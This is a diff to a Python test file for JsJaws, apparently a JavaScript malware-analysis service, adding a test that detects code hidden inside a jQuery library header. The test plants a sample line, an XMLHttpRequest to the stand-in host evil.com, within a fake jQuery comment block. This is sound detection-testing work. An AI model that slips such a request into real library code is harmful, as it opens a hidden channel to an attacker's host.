@@ -115,6 +115,14 @@ def dummy_completed_process_instance():
     yield DummyCompletedProcess()
 
 
+@pytest.fixture
+def dummy_get_response_class():
+    class DummyGetResponse:
+        def __init__(self, text):
+            self.text = text
+    yield DummyGetResponse
+
+
 class TestJsJaws:
     @classmethod
     def setup_class(cls):
@@ -614,3 +622,32 @@ class TestJsJaws:
         output = ["https://blah.com/blah.exe"]
         jsjaws_class_instance._extract_malware_jail_iocs(output, res)
         assert check_section_equality(res.sections[0], correct_res_sec)
+
+    @staticmethod
+    def test_extract_filtered_jquery(jsjaws_class_instance, dummy_get_response_class, mocker):
+        from os import path, remove
+        from assemblyline_v4_service.common.result import Result, ResultSection
+        evil_string = "XMLHttpRequest('http://evil.com');\n"
+        fake_response_text = "/*!\n * jQuery JavaScript Library v1.11.3\n * http://jquery.com/\n *\n * Includes Sizzle.js\n * http://sizzlejs.com/\n *\n * Copyright 2005, 2014 jQuery Foundation, Inc. and other contributors\n * Released under the MIT license\n * http://jquery.org/license\n *\n * Date: 2015-04-28T16:19Z\n */"
+        mocker.patch("jsjaws.get", return_value=dummy_get_response_class(fake_response_text))
+        file_contents = f"/*!\n * jQuery JavaScript Library v1.11.3\n * http://jquery.com/\n *\n * Includes Sizzle.js\n * http://sizzlejs.com/\n *\n * Copyright 2005, 2014 jQuery Foundation, Inc. and other contributors\n * Released under the MIT license\n{evil_string} * http://jquery.org/license\n *\n * Date: 2015-04-28T16:19Z\n */"
+        jsjaws_class_instance.filtered_jquery = "filtered_jquery.js"
+        jsjaws_class_instance.filtered_jquery_path = path.join("/tmp", jsjaws_class_instance.filtered_jquery)
+        jsjaws_class_instance.artifact_list = []
+        res = Result()
+        correct_res_sec = ResultSection("Embedded code was found in jQuery library",
+                                        body=f"View extracted file {jsjaws_class_instance.filtered_jquery} for details.")
+        correct_res_sec.set_heuristic(4)
+        jsjaws_class_instance._extract_filtered_jquery(res, file_contents)
+
+        assert path.exists(jsjaws_class_instance.filtered_jquery_path)
+        with open(jsjaws_class_instance.filtered_jquery_path, "r") as f:
+            assert f.read() == evil_string.rstrip("\n")
+        assert jsjaws_class_instance.artifact_list[0] == {
+                "name": jsjaws_class_instance.filtered_jquery,
+                "path": jsjaws_class_instance.filtered_jquery_path,
+                "description": "JavaScript embedded within jQuery library",
+                "to_be_extracted": True
+        }
+        assert check_section_equality(res.sections[0], correct_res_sec)
+        remove(jsjaws_class_instance.filtered_jquery_path)
